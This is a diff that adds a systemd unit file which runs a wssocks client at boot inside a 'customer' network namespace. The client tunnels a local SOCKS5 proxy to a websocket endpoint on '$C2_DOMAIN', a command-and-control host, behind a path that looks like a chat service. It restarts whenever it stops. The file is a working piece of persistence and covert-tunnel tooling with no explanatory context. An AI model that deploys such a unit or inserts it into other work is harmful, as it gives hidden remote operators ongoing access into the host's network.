@@ -1,0 +1,12 @@
+[Unit]
+Description=Websockets Sock5 Bridge
+After=cust_rules.service
+
+[Service]
+Type=simple
+ExecStart=ip netns exec customer nohup /opt/wssocks client -addr 169.254.2.2:1111 -remote 'wss://$C2_DOMAIN/chat_service/ws' &
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
